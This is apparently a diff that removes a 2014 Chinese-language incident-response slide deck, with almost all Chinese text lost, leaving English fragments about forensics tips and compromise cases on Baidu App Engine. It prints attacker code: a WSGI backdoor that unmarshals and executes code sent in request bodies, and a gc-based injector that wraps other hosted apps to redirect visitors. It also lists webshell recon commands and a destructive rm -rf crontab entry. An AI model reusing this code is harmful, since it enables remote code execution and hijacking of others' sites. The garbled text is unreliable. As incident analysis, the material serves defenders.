@@ -1,146 +1,0 @@
-
- 2014.09
-
-Agenda
-WHO AM I  case 
-
-Agenda
-WHO AM I  case 
-
-WHO AM I
- AKA xi4oyu & http://weibo.com/evilxi4oyu
-
-Agenda
-WHO AM I  case 
-
-
-
-  
-There are two types of people: those who've been hacked and those who don't know they've been hacked
-
-
-
-*SRC 
- DDOS       ""
-
-(Cont.)
-
-    ­  
-
-
-
-
-
-
-
-
-
-/
-
-
-
-
-
-
-
-WEB
-
-- /
-
- 
-
- 
-
-tips 
-Inode 
-
-tipsCont.)
-
-
-tipsCont.)
-MAC 
-
-tipsCont.)
-
-
-Agenda
-WHO AM I  case 
-
-Case 1
-    
-     ?  3-4  ctime
-
-Case 1(Cont.)
- 
-Crontab ­l app
-rm ­rf $VARXXX/ 
-
-Case 2
-webshell
-webshell  1. ipconfig 2. net user 3. net view 4. nbtstat ... Linux
-
-Case 3
-BAE 
- BAE 
-BAE passport 
-> OK 
-
-/
-
-
-
- www.e***times.com**,XX  -> BAE
- XXXXX, xxtimes
- 
-
-
-
-BAE BVS->RS(ui)->CGI->codefs
-python UIcurl
-BAElighttpd 100%(21/191 11%) ,conf, rewrite ctime  404
- lighttpd
-
-(Cont.)
-CGI
-BAE cgi sandbox python 
- PythonwebCGI  CGI  cgicorestrings
-e***timesCGI  Gdb ­cBT 
-Stack 00000 
-
-(Cont.)
-
-Python  Socket/stdin/stdout |  e**timesstdout stderr fileno
-  CGImax time 
-   IP  
- proxy3.pyt**t0.duapp.com pyt**t0.duapp.com
-
-
-import marshal import sys import StringIO import traceback
-def application(environ, start_response): start_response('200 ok', []) buf = StringIO.StringIO() compiled = marshal.loads(environ['wsgi.input'].read(int(environ['CONTENT_LENGTH']))) try: old_stdout = sys.stdout old_stderr = sys.stderr try: sys.stdout = buf sys.stderr = buf exec compiled
-BAEXX 
-
-
-def app(a): def _(environ, start_response):
-start_response('301 Moved Permanently', [('Location', 'http://www.e***times.com/'),]) return ['ok',]
-return a(environ, start_response) return _
-import gc import sys
-for sysdict in gc.get_referrers(sys.version): ms = sysdict.get('modules', None) if ms: for m in ms: if m.startswith('_mod_wsgi'): if hasattr(ms[m], 'application'): if hasattr(ms[m].application, 'func_name') and ms[m].application.func_name == '_': print ms[m].application elif hasattr(ms[m].application, '_mark'): print 'myself' else: print 'inject:', ms[m].application ms[m].application = app(ms[m].application)
-import os print os.getpid()
-
-Lesson Learned
-No ghost online   
-
-
-BAE   BAE
-
-
-    
-
-
--   & -
-step 1 ­ x
-
-Q & A
- 
-
-
